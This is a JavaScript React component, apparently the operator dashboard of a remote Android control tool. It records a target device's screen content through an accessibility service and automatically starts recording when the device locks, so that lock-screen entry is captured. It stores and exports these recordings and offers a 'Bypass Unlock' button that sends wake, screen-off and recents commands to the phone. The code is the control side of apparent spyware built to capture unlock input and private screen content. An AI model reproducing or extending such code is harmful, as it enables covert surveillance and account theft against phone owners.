import React, { useState, useRef, useEffect, useCallback } from 'react';

const PHONE_W = 320;
const PHONE_H = 680;
const LOCK_PKG = 'com.android.systemui';
const MAX_RECORDINGS = 100;

const LAUNCHER_PKGS = new Set([
  'com.android.launcher', 'com.android.launcher2', 'com.android.launcher3',
  'com.google.android.apps.nexuslauncher', 'com.miui.home', 'com.huawei.android.launcher',
  'com.sec.android.app.launcher', 'com.oppo.launcher', 'com.vivo.launcher',
  'com.oneplus.launcher', 'com.realme.launcher', 'com.zte.mifavor.launcher',
]);

function isLauncherPkg(pkg) {
  if (!pkg) return false;
  if (LAUNCHER_PKGS.has(pkg)) return true;
  if (pkg.includes('launcher') || pkg.includes('home')) return true;
  return false;
}

function formatDuration(ms) {
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const rem = s % 60;
  if (m > 0) return `${m}m ${rem}s`;
  return `${s}s`;
}

function formatTime(ts) {
  if (!ts) return '';
  return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

function formatDate(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  const today = new Date();
  if (d.toDateString() === today.toDateString()) return 'Today';
  return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
}

function renderFrameElements(screenData, devW, devH) {
  if (!screenData) return null;
  const elements = (screenData.elements || []).filter(
    el => el.text || el.contentDescription || el.hintText || el.clickable || el.editable
  );
  const scX = PHONE_W / devW;
  const scY = PHONE_H / devH;

  const getStyle = (el) => {
    if (el.editable)  return { border: '1.5px solid #3b82f6', background: 'rgba(59,130,246,0.12)' };
    if (el.clickable) return { border: '1px solid rgba(34,197,94,0.5)',  background: 'rgba(34,197,94,0.07)' };
    if (el.selected || el.checked) return { border: '1px solid rgba(234,179,8,0.5)', background: 'rgba(234,179,8,0.07)' };
    if (el.text || el.contentDescription) return { border: '1px solid rgba(148,163,184,0.16)', background: 'transparent' };
    return { border: '1px dashed rgba(100,116,139,0.12)', background: 'transparent' };
  };

  return [...elements]
    .filter(el => el.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const aB = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aB - aA;
    })
    .map((el, i) => {
      const left   = el.bounds.left * scX;
      const top    = el.bounds.top  * scY + 20;
      const width  = (el.bounds.right  - el.bounds.left) * scX;
      const height = (el.bounds.bottom - el.bounds.top)  * scY;
      if (width < 2 || height < 2) return null;
      const label = (el.text || el.contentDescription || el.hintText || '').slice(0, 32);
      return (
        <div
          key={i}
          style={{
            position: 'absolute', left, top, width, height,
            ...getStyle(el),
            borderRadius: 3, boxSizing: 'border-box', overflow: 'hidden',
            display: 'flex', alignItems: 'center', padding: '0 2px',
          }}
        >
          {height > 10 && label && (
            <span style={{
              fontSize: Math.min(Math.max(height * 0.36, 6.5), 9.5),
              color: el.editable ? '#93c5fd' : el.clickable ? '#86efac' : '#cbd5e1',
              whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis',
              lineHeight: 1.2, pointerEvents: 'none',
              fontWeight: el.clickable ? 600 : 400,
            }}>
              {label}
            </span>
          )}
        </div>
      );
    });
}

function addRecording(prev, rec) {
  const next = [rec, ...prev];
  if (next.length > MAX_RECORDINGS) return next.slice(0, MAX_RECORDINGS);
  return next;
}

export default function ScreenReaderRecorder({ device, sendCommand, results, screenReaderPushData, offlineRecordingVersion }) {
  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;
  const info     = device?.deviceInfo || {};
  const devW     = info.screenWidth  || 1080;
  const devH     = info.screenHeight || 2340;

  const [isRecording, setIsRecording]     = useState(false);
  const [recordings, setRecordings]       = useState([]);
  const [currentFrames, setCurrentFrames] = useState([]);
  const [loadingRecs, setLoadingRecs]     = useState(false);
  const [lastFetched, setLastFetched]     = useState(null);

  const [playing, setPlaying]       = useState(null);
  const [playIdx, setPlayIdx]       = useState(0);
  const [isPlaying, setIsPlaying]   = useState(false);
  const [playSpeed, setPlaySpeed]   = useState(500);

  const [keepAlive, setKeepAlive]   = useState(false);
  const [recElapsed, setRecElapsed] = useState(0);

  const keepAliveTimerRef  = useRef(null);
  const isRecordingRef     = useRef(false);
  const framesRef          = useRef([]);
  const playTimerRef       = useRef(null);
  const prevPkgRef         = useRef(null);
  const startTimeRef       = useRef(null);
  const seenRecordingIds   = useRef(new Set());
  const elapsedTimerRef    = useRef(null);

  useEffect(() => { isRecordingRef.current = isRecording; }, [isRecording]);

  useEffect(() => {
    if (!results || !isOnline) return;
    const relevant = results.filter(r =>
      (r.command === 'list_screen_recordings' || r.command === 'get_screen_recording') &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenRecordingIds.current.has(r.id)) return;
      seenRecordingIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (r.command === 'list_screen_recordings' && data.recordings) {
          data.recordings.forEach(rec => {
            if (rec.filename) {
              sendCommand(deviceId, 'get_screen_recording', { filename: rec.filename });
            }
          });
        }
        if (r.command === 'get_screen_recording' && data.frames && data.filename) {
          setRecordings(prev => {
            const exists = prev.find(p => p.filename === data.filename);
            if (exists) return prev;
            const newRec = {
              id: data.filename,
              filename: data.filename,
              label: data.label || `Recording ${formatTime(data.startTime || Date.now())}`,
              frames: data.frames || [],
              duration: ((data.endTime || 0) - (data.startTime || 0)) || (data.frameCount || 0) * 1000,
              frameCount: data.frameCount || (data.frames || []).length,
              startTime: data.startTime,
              endTime: data.endTime,
            };
            return [newRec, ...prev].slice(0, 100);
          });
        }
      } catch (_) {}
    });
  }, [results, isOnline, deviceId, sendCommand]);

  const fetchRecordings = useCallback(() => {
    if (!deviceId) return;
    setLoadingRecs(true);
    sendCommand(deviceId, 'list_screen_recordings', {});
    setLastFetched(Date.now());
    setTimeout(() => setLoadingRecs(false), 3000);
  }, [deviceId, sendCommand]);

  useEffect(() => { fetchRecordings(); }, [fetchRecordings]);

  useEffect(() => {
    if (offlineRecordingVersion) fetchRecordings();
  }, [offlineRecordingVersion, fetchRecordings]);

  useEffect(() => {
    const id = setInterval(() => { if (!isRecordingRef.current) fetchRecordings(); }, 30000);
    return () => clearInterval(id);
  }, [fetchRecordings]);

  const saveRecordingToBackend = useCallback(async (rec) => {
    if (!deviceId) return null;
    try {
      const res = await fetch(`/api/recordings/${encodeURIComponent(deviceId)}/save`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          frames: rec.frames,
          label: rec.label,
          startTime: rec.startTime,
          endTime: rec.endTime,
          frameCount: rec.frameCount,
        }),
      });
      if (!res.ok) return null;
      const data = await res.json();
      return data.filename || null;
    } catch (_) { return null; }
  }, [deviceId]);

  const stopRecording = useCallback(async (frames, sendStopCmd = true) => {
    if (sendStopCmd) sendCommand(deviceId, 'screen_reader_stop', {});
    setIsRecording(false);
    isRecordingRef.current = false;
    clearInterval(elapsedTimerRef.current);
    setRecElapsed(0);
    const captured = frames || framesRef.current;
    if (captured.length > 0) {
      const now = Date.now();
      const label = `Recording ${formatTime(startTimeRef.current || now)} · ${formatDate(startTimeRef.current || now)}`;
      const rec = {
        id: now,
        label,
        frames: captured,
        duration: captured.length * 1000,
        frameCount: captured.length,
        startTime: startTimeRef.current || now,
        endTime: now,
      };
      setRecordings(prev => addRecording(prev, rec));
      saveRecordingToBackend(rec).then(filename => {
        if (filename) {
          setRecordings(prev => prev.map(r =>
            r.id === rec.id ? { ...r, filename } : r
          ));
        }
      });
    }
    framesRef.current = [];
    startTimeRef.current = null;
    setCurrentFrames([]);
    prevPkgRef.current = null;
  }, [deviceId, sendCommand, saveRecordingToBackend]);

  const startRecording = useCallback((auto = false) => {
    framesRef.current = [];
    startTimeRef.current = Date.now();
    setCurrentFrames([]);
    prevPkgRef.current = null;
    setRecElapsed(0);
    if (!auto) sendCommand(deviceId, 'screen_reader_start', {});
    setIsRecording(true);
    isRecordingRef.current = true;
    clearInterval(elapsedTimerRef.current);
    elapsedTimerRef.current = setInterval(() => {
      setRecElapsed(e => e + 1);
    }, 1000);
  }, [deviceId, sendCommand]);

  useEffect(() => {
    if (!screenReaderPushData) return;
    const autoEvent = screenReaderPushData.autoEvent;
    if (autoEvent === 'start') {
      framesRef.current = [];
      startTimeRef.current = Date.now();
      setCurrentFrames([]);
      prevPkgRef.current = null;
      setIsRecording(true);
      isRecordingRef.current = true;
      setRecElapsed(0);
      clearInterval(elapsedTimerRef.current);
      elapsedTimerRef.current = setInterval(() => setRecElapsed(e => e + 1), 1000);
      return;
    }
    if (autoEvent === 'stop') {
      if (isRecordingRef.current) stopRecording(framesRef.current, false);
      return;
    }
    if (!isRecordingRef.current) return;
    if (!screenReaderPushData?.success || !screenReaderPushData?.screen) return;
    const screen = screenReaderPushData.screen;
    const pkg    = screen.packageName || '';
    const prevPkg = prevPkgRef.current;
    prevPkgRef.current = pkg;
    const frame = { ts: Date.now(), screen };
    framesRef.current = [...framesRef.current, frame];
    setCurrentFrames([...framesRef.current]);
    if (prevPkg === LOCK_PKG && pkg !== LOCK_PKG && isLauncherPkg(pkg)) {
      stopRecording(framesRef.current);
    }
  }, [screenReaderPushData, stopRecording]);

  useEffect(() => () => {
    clearInterval(elapsedTimerRef.current);
    clearInterval(playTimerRef.current);
  }, []);

  const stopPlayback = useCallback(() => {
    clearInterval(playTimerRef.current);
    setIsPlaying(false);
  }, []);

  const startPlayback = useCallback((rec) => {
    clearInterval(playTimerRef.current);
    setPlaying(rec);
    setPlayIdx(0);
    setIsPlaying(true);
    let idx = 0;
    playTimerRef.current = setInterval(() => {
      idx++;
      if (idx >= rec.frames.length) {
        clearInterval(playTimerRef.current);
        setIsPlaying(false);
        setPlayIdx(rec.frames.length - 1);
      } else {
        setPlayIdx(idx);
      }
    }, playSpeed);
  }, [playSpeed]);

  useEffect(() => {
    clearInterval(keepAliveTimerRef.current);
    if (keepAlive && isOnline) {
      sendCommand(deviceId, 'wake_screen', {});
      keepAliveTimerRef.current = setInterval(() => {
        sendCommand(deviceId, 'wake_screen', {});
      }, 5000);
    }
    return () => clearInterval(keepAliveTimerRef.current);
  }, [keepAlive, isOnline, deviceId, sendCommand]);

  useEffect(() => {
    if (!isOnline) { setKeepAlive(false); clearInterval(keepAliveTimerRef.current); }
  }, [isOnline]);

  const deleteRecording = async (id, filename) => {
    if (playing?.id === id) { stopPlayback(); setPlaying(null); }
    setRecordings(prev => prev.filter(r => r.id !== id));
    if (filename && deviceId) {
      try {
        await fetch(`/api/recordings/${encodeURIComponent(deviceId)}/${encodeURIComponent(filename)}`, {
          method: 'DELETE',
        });
      } catch (_) {}
    }
  };

  const exportRecording = (rec) => {
    const blob = new Blob([JSON.stringify(rec, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${rec.filename || `recording_${rec.id}`}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const displayFrame = playing
    ? (playing.frames[playIdx]?.screen || null)
    : (currentFrames.length > 0 ? currentFrames[currentFrames.length - 1]?.screen : null);

  const displayPkg = displayFrame?.packageName || '';

  const totalRecFrames = playing?.frames?.length || 0;
  const progress = totalRecFrames > 1 ? (playIdx / (totalRecFrames - 1)) * 100 : 0;

  const Btn = ({ label, onClick, bg, disabled = false, small = false, style = {} }) => (
    <button
      onClick={onClick}
      disabled={disabled}
      style={{
        border: 'none', borderRadius: 6,
        padding: small ? '4px 9px' : '5px 13px',
        background: disabled ? '#1e293b' : bg,
        color: disabled ? '#475569' : '#f1f5f9',
        cursor: disabled ? 'not-allowed' : 'pointer',
        fontSize: small ? 10 : 11, fontWeight: 600, whiteSpace: 'nowrap',
        transition: 'opacity 0.15s',
        ...style,
      }}
    >
      {label}
    </button>
  );

  return (
    <div style={{ display: 'flex', gap: 16, alignItems: 'flex-start', flexWrap: 'wrap' }}>

      {/* LEFT: Phone viewer + controls */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Status badge */}
        <div style={{
          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
          padding: '4px 12px', borderRadius: 20,
          background: isRecording ? 'rgba(220,38,38,0.15)' : playing ? 'rgba(124,58,237,0.15)' : 'rgba(15,23,42,0.6)',
          border: `1px solid ${isRecording ? '#dc2626' : playing ? '#7c3aed' : '#334155'}`,
          alignSelf: 'center',
        }}>
          <span style={{ fontSize: 9, fontWeight: 800, letterSpacing: 1.5, textTransform: 'uppercase',
            color: isRecording ? '#ef4444' : playing ? '#a78bfa' : '#475569' }}>
            {isRecording ? '● REC' : playing ? '▶ PLAYBACK' : '○ STANDBY'}
          </span>
          {isRecording && (
            <span style={{ fontSize: 10, color: '#fca5a5', fontVariantNumeric: 'tabular-nums' }}>
              {formatDuration(recElapsed * 1000)} · {currentFrames.length} frames
            </span>
          )}
          {playing && (
            <span style={{ fontSize: 10, color: '#c4b5fd', fontVariantNumeric: 'tabular-nums' }}>
              {playIdx + 1} / {totalRecFrames}
            </span>
          )}
        </div>

        {/* Phone frame */}
        <div style={{
          background: '#1e293b', borderRadius: 28, padding: '16px 10px 12px',
          border: `2px solid ${isRecording ? '#dc2626' : playing ? '#7c3aed' : '#334155'}`,
          display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
          boxShadow: isRecording
            ? '0 0 24px rgba(220,38,38,0.3)'
            : playing ? '0 0 24px rgba(124,58,237,0.2)' : '0 4px 20px rgba(0,0,0,0.4)',
          transition: 'all 0.3s',
        }}>
          <div style={{ width: 56, height: 5, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

          <div style={{
            width: PHONE_W, height: PHONE_H,
            background: displayFrame ? '#101828' : '#0a0f1e',
            borderRadius: 8, border: '1px solid #1e293b',
            overflow: 'hidden', position: 'relative',
          }}>
            {!displayFrame && (
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', gap: 10 }}>
                <div style={{ fontSize: 40, opacity: 0.3 }}>🎥</div>
                <div style={{ fontSize: 11, color: '#334155', textAlign: 'center', lineHeight: 1.6, padding: '0 16px' }}>
                  {isRecording ? 'Waiting for accessibility frame…'
                    : playing ? 'No frame data'
                    : 'Auto-records when device locks.\nPush Record to capture manually.'}
                </div>
              </div>
            )}

            {displayFrame && (
              <>
                <div style={{
                  position: 'absolute', top: 0, left: 0, right: 0, height: 20,
                  background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center',
                  padding: '0 8px', zIndex: 50, gap: 6, backdropFilter: 'blur(4px)',
                }}>
                  <div style={{ width: 5, height: 5, borderRadius: '50%',
                    background: isRecording ? '#ef4444' : '#a78bfa',
                    animation: isRecording ? 'pulse 1s infinite' : 'none' }} />
                  <span style={{ fontSize: 8, color: '#94a3b8', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {displayPkg || 'Unknown app'}
                  </span>
                  {displayFrame?.elementCount != null && (
                    <span style={{ fontSize: 7, color: '#475569' }}>{displayFrame.elementCount} nodes</span>
                  )}
                </div>
                {renderFrameElements(displayFrame, devW, devH)}
              </>
            )}
          </div>

          {/* Playback scrubber */}
          {playing && totalRecFrames > 1 && (
            <div style={{ width: PHONE_W, display: 'flex', flexDirection: 'column', gap: 4 }}>
              <div style={{ position: 'relative', height: 4, background: '#1e293b', borderRadius: 2, cursor: 'pointer' }}
                onClick={e => {
                  const rect = e.currentTarget.getBoundingClientRect();
                  const ratio = (e.clientX - rect.left) / rect.width;
                  const newIdx = Math.round(ratio * (totalRecFrames - 1));
                  stopPlayback();
                  setPlayIdx(Math.max(0, Math.min(newIdx, totalRecFrames - 1)));
                }}
              >
                <div style={{ position: 'absolute', top: 0, left: 0, height: '100%',
                  width: `${progress}%`, background: '#7c3aed', borderRadius: 2, transition: 'width 0.1s' }} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 9, color: '#475569' }}>
                <span>0:00</span>
                <span>{formatDuration(playIdx * playSpeed)}</span>
                <span>{formatDuration(totalRecFrames * playSpeed)}</span>
              </div>
            </div>
          )}

          <div style={{ width: 60, height: 4, background: '#334155', borderRadius: 4, marginTop: 2 }} />
        </div>

        {/* Record / playback controls */}
        <div style={{ display: 'flex', gap: 6, justifyContent: 'center', flexWrap: 'wrap' }}>
          {!isRecording ? (
            <Btn label="● Record" onClick={() => startRecording(false)} bg="#7f1d1d" disabled={!isOnline} />
          ) : (
            <Btn label="⏹ Stop" onClick={() => stopRecording()} bg="#dc2626" />
          )}

          {playing && (
            <>
              {isPlaying
                ? <Btn label="⏸ Pause" onClick={stopPlayback} bg="#334155" />
                : <Btn label="▶ Resume" onClick={() => startPlayback(playing)} bg="#4c1d95" disabled={totalRecFrames === 0} />
              }
              <Btn label="⏮ Restart" onClick={() => { stopPlayback(); setPlayIdx(0); }} bg="#1e293b" />
              <Btn label="✕ Close" onClick={() => { stopPlayback(); setPlaying(null); }} bg="#334155" />
            </>
          )}
        </div>

        {/* Speed selector (when playing) */}
        {playing && (
          <div style={{ display: 'flex', gap: 6, alignItems: 'center', justifyContent: 'center' }}>
            <span style={{ fontSize: 10, color: '#475569' }}>Speed:</span>
            {[200, 500, 1000, 2000].map(ms => (
              <button
                key={ms}
                onClick={() => {
                  setPlaySpeed(ms);
                  if (isPlaying) { stopPlayback(); setTimeout(() => startPlayback(playing), 50); }
                }}
                style={{
                  border: `1px solid ${playSpeed === ms ? '#7c3aed' : '#334155'}`,
                  borderRadius: 6, padding: '3px 7px',
                  background: playSpeed === ms ? '#4c1d95' : '#1e293b',
                  color: playSpeed === ms ? '#c4b5fd' : '#475569',
                  cursor: 'pointer', fontSize: 10, fontWeight: 600,
                }}
              >
                {ms === 200 ? '0.2s' : ms === 500 ? '0.5s' : ms === 1000 ? '1s' : '2s'}
              </button>
            ))}
          </div>
        )}

        {/* Bypass Unlock */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'center' }}>
          <button
            disabled={!isOnline}
            onClick={() => {
              if (keepAlive) {
                setKeepAlive(false);
              } else {
                sendCommand(deviceId, 'screen_off', {});
                setTimeout(() => sendCommand(deviceId, 'wake_screen', {}), 1000);
                setTimeout(() => sendCommand(deviceId, 'press_recents', {}), 1500);
                setKeepAlive(true);
              }
            }}
            style={{
              border: 'none', borderRadius: 8, padding: '7px 22px',
              background: keepAlive
                ? 'linear-gradient(135deg,#14532d,#166534)'
                : (isOnline ? 'linear-gradient(135deg,#4c1d95,#6d28d9)' : '#1e293b'),
              color: keepAlive ? '#86efac' : (isOnline ? '#f1f5f9' : '#475569'),
              cursor: isOnline ? 'pointer' : 'not-allowed',
              fontSize: 11, fontWeight: 700, letterSpacing: 0.5,
              boxShadow: keepAlive ? '0 0 12px rgba(34,197,94,0.35)'
                : (isOnline ? '0 0 10px rgba(109,40,217,0.3)' : 'none'),
              transition: 'all 0.25s', whiteSpace: 'nowrap',
            }}
          >
            {keepAlive ? '🟢 Stop Bypass' : '🔓 Bypass Unlock'}
          </button>
          {keepAlive && (
            <div style={{ fontSize: 9, color: '#22c55e', textAlign: 'center' }}>
              Keeps screen awake · wakes every 5s
            </div>
          )}
        </div>
      </div>

      {/* RIGHT: Recordings list */}
      <div style={{ flex: 1, minWidth: 240, display: 'flex', flexDirection: 'column', gap: 8 }}>

        {/* Header */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 8,
          background: '#0f172a', borderRadius: 10, padding: '8px 12px',
          border: '1px solid #1e293b',
        }}>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: '#e2e8f0' }}>
              Screen Recordings
            </div>
            <div style={{ fontSize: 9, color: '#475569', marginTop: 1 }}>
              {recordings.length} of {MAX_RECORDINGS} max
              {lastFetched && ` · synced ${formatTime(lastFetched)}`}
            </div>
          </div>
          <button
            onClick={fetchRecordings}
            disabled={loadingRecs}
            title="Refresh recordings from server"
            style={{
              border: '1px solid #334155', borderRadius: 8,
              padding: '6px 14px',
              background: loadingRecs ? '#1e293b' : '#0f172a',
              color: loadingRecs ? '#475569' : '#94a3b8',
              cursor: loadingRecs ? 'not-allowed' : 'pointer',
              fontSize: 11, fontWeight: 600, display: 'flex', alignItems: 'center', gap: 6,
              transition: 'all 0.15s',
            }}
          >
            {loadingRecs ? (
              <>
                <span style={{ display: 'inline-block', animation: 'spin 1s linear infinite', fontSize: 12 }}>↻</span>
                <span>Loading…</span>
              </>
            ) : '↻ Get Recordings'}
          </button>
        </div>

        {/* Empty state */}
        {recordings.length === 0 && !loadingRecs && (
          <div style={{
            background: '#0f172a', borderRadius: 12, border: '1px dashed #1e293b',
            padding: '32px 20px', textAlign: 'center',
            display: 'flex', flexDirection: 'column', gap: 8, alignItems: 'center',
          }}>
            <div style={{ fontSize: 36, opacity: 0.4 }}>🎞</div>
            <div style={{ fontSize: 13, color: '#64748b', fontWeight: 600 }}>No recordings yet</div>
            <div style={{ fontSize: 11, color: '#334155', lineHeight: 1.6 }}>
              Recordings are saved automatically when the<br />
              device locks, or you can start one manually.
            </div>
          </div>
        )}

        {/* Loading skeleton */}
        {loadingRecs && recordings.length === 0 && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
            {[1, 2].map(i => (
              <div key={i} style={{
                background: '#0f172a', borderRadius: 10, border: '1px solid #1e293b',
                padding: '12px 14px', height: 68, opacity: 0.5,
                animation: 'pulse 1.5s ease-in-out infinite',
              }} />
            ))}
          </div>
        )}

        {/* Recording cards */}
        {recordings.map(rec => {
          const isActive = playing?.id === rec.id;
          return (
            <div
              key={rec.id}
              style={{
                background: isActive ? '#1e1b4b' : '#0f172a',
                borderRadius: 12,
                border: `1px solid ${isActive ? '#7c3aed' : '#1e293b'}`,
                padding: '10px 14px',
                display: 'flex', flexDirection: 'column', gap: 8,
                transition: 'all 0.2s',
                boxShadow: isActive ? '0 0 0 1px #7c3aed33' : 'none',
              }}
            >
              {/* Top row */}
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
                <div style={{
                  width: 36, height: 36, borderRadius: 8, flexShrink: 0,
                  background: isActive ? '#4c1d95' : '#1e293b',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                  fontSize: 16,
                }}>
                  🎞
                </div>

                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{
                    fontWeight: 600, color: isActive ? '#ddd6fe' : '#e2e8f0',
                    fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap',
                  }}>
                    {rec.label}
                  </div>
                  <div style={{ fontSize: 10, color: '#475569', display: 'flex', gap: 10, marginTop: 2, flexWrap: 'wrap' }}>
                    <span>{rec.frameCount || 0} frames</span>
                    <span>~{formatDuration(rec.duration || rec.frameCount * 1000)}</span>
                    {rec.startTime && <span>{formatDate(rec.startTime)}</span>}
                    {rec.filename
                      ? <span style={{ color: '#22c55e', fontWeight: 700 }}>✓ saved</span>
                      : <span style={{ color: '#f59e0b', fontWeight: 700 }}>⚠ unsaved</span>
                    }
                  </div>
                </div>

                {/* Action buttons */}
                <div style={{ display: 'flex', gap: 4, flexShrink: 0 }}>
                  <Btn
                    label={isActive ? '⏏' : '▶'}
                    onClick={() => {
                      if (isActive) { stopPlayback(); setPlaying(null); }
                      else { startPlayback(rec); }
                    }}
                    bg={isActive ? '#7c3aed' : '#4c1d95'}
                    small
                  />
                  {rec.frames?.length > 0 && (
                    <Btn
                      label="⬇"
                      onClick={() => exportRecording(rec)}
                      bg="#1e3a5f"
                      small
                      style={{ title: 'Export JSON' }}
                    />
                  )}
                  <Btn
                    label="🗑"
                    onClick={() => deleteRecording(rec.id, rec.filename)}
                    bg="#7f1d1d"
                    small
                  />
                </div>
              </div>

              {/* Frame strip (only when this recording is active or has few frames) */}
              {rec.frameCount > 0 && rec.frames?.length > 0 && (
                <div style={{
                  display: 'flex', gap: 2, overflowX: 'auto', paddingBottom: 2,
                  scrollbarWidth: 'thin', scrollbarColor: '#334155 transparent',
                }}>
                  {rec.frames.map((f, fi) => {
                    const isCurrentFrame = isActive && fi === playIdx;
                    const appName = f.screen?.packageName?.split('.').pop() || '';
                    return (
                      <div
                        key={fi}
                        onClick={() => {
                          if (isActive) { stopPlayback(); setPlayIdx(fi); }
                          else { startPlayback(rec); setTimeout(() => { stopPlayback(); setPlayIdx(fi); }, 50); }
                        }}
                        title={`Frame ${fi + 1}${appName ? ` · ${appName}` : ''}`}
                        style={{
                          width: 26, height: 44, flexShrink: 0,
                          background: isCurrentFrame ? '#4c1d95' : '#1e293b',
                          border: `1px solid ${isCurrentFrame ? '#7c3aed' : '#0f172a'}`,
                          borderRadius: 4, cursor: 'pointer',
                          display: 'flex', flexDirection: 'column', alignItems: 'center',
                          justifyContent: 'center', gap: 2,
                          transition: 'all 0.1s',
                        }}
                      >
                        <span style={{ fontWeight: 700, fontSize: 7, color: isCurrentFrame ? '#c4b5fd' : '#475569' }}>
                          {fi + 1}
                        </span>
                        {appName && (
                          <div style={{
                            fontSize: 5, color: isCurrentFrame ? '#a78bfa' : '#334155',
                            textAlign: 'center', overflow: 'hidden', whiteSpace: 'nowrap',
                            textOverflow: 'ellipsis', width: '100%', padding: '0 2px',
                          }}>
                            {appName}
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          );
        })}
      </div>

      <style>{`
        @keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:0.4 } }
        @keyframes spin { from { transform:rotate(0deg) } to { transform:rotate(360deg) } }
      `}</style>
    </div>
  );
}
